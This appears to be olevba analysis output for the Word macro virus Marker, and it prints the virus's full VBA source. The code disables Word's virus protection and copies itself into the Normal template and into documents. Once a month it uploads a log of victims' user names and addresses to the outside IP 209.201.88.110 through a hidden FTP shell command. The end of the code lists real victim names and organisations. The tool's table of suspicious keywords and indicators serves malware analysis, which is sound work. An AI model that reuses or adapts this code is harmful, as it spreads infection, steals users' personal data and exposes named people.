olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-ae01eb832c88c427d47c34658e3295e1377fdfdb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Marker.fq2-ae01eb832c88c427d47c34658e3295e1377fdfdb - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

'Yarra Valley Water Ltd Loves Nicky F. Also! 10/03/1999 16:41:24
'Yarra Valley Water Ltd Loves Nicky F. Also! 11/03/1999 17:25:30
'Yarra Valley Water Ltd Loves Nicky F. Also! 15/03/1999 14:30:15
'Yarra Valley Water Ltd Loves Nicky F. Also! 15/03/1999 16:12:29
'Temp Loves Nicky F. Also! 21/04/99 10:24:18
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 08:12:46  - Friday, 15 Jan 1999
' cpitty
'



' 02:03:13  - Tuesday, 19 Jan 1999
' NT Standard
'



' 10:43:16  - Friday, 5 Feb 1999
' Sally
'



' 11:23:33  - Saturday, 6 Feb 1999
' EST
'



' 11:03:03  - Sunday, 7 Feb 1999
' ALLAN DOW
'



' 06:28:58  - Sunday, 7 Feb 1999
' Gordon Chalmers
'



' 08:48:08 AM - Tuesday, 16 Feb 1999
' Ian
'



' 01:49:50 AM - Thursday, 25 Feb 1999
' Melinda
'



' 12:52:39  - Thursday, 4 Mar 1999
' Spotless Services Australia Limited
'



' 11:32:14  - Friday, 5 Mar 1999
' Spotless Services Limited
'



' 03:51:47  - Tuesday, 16 Mar 1999
' DObrien
'



' 04:30:37 PM - Wednesday, 28 Apr 1999
' Temp
'


'. Loves Nicky F. Also! 8/05/99 03:42:53


'REDDIN CONSULTING GROUP. Loves Nicky F. Also! 12/05/99 15:44:31


'Reddin Consulting Group Loves Nicky F. Also! 17/05/1999 11:06:56 AM


'Richard Brown Loves Nicky F. Also! 19/05/1999 15:11:47


'Judi Anderson. Loves Nicky F. Also! 19/May/99 4:20:47 PM



' 04:35:23 PM - Monday, 31 May 1999
' Mary Cashman
'



' 03:53:04 PM - Monday, 7 Jun 1999
' Mary Cashman
'



' 09:01:47  - Friday, 2 Jul 1999
' lwright
'



' 11:08:06  - Wednesday, 14 Jul 1999
' Alan O'Riordan
'



' 02:54:36 PM - Tuesday, 10 Aug 1999
' rdevesco
'



' 05:25:24  - Monday, 6 Sep 1999
' Kay
'



' 04:34:37 p - Thursday, 16 Sep 1999
' Lynn Varty
'



' 09:23:59  - Friday, 17 Sep 1999
' Dianne Youel
'



' 11:39:51  - Monday, 20 Sep 1999
' Dianne Youel
'



' 08:32:01 AM - Wednesday, 22 Sep 1999
' Markus Schmall
'




-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSWord.Marker.fq2-ae01eb832c88c427d47c34658e3295e1377fdfdb - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSWord.Marker.fq2-ae01eb832c88c427d47c34658e3295e1377fdfdb - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSWord.Marker.fq2-ae01eb832c88c427d47c34658e3295e1377fdfdb - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

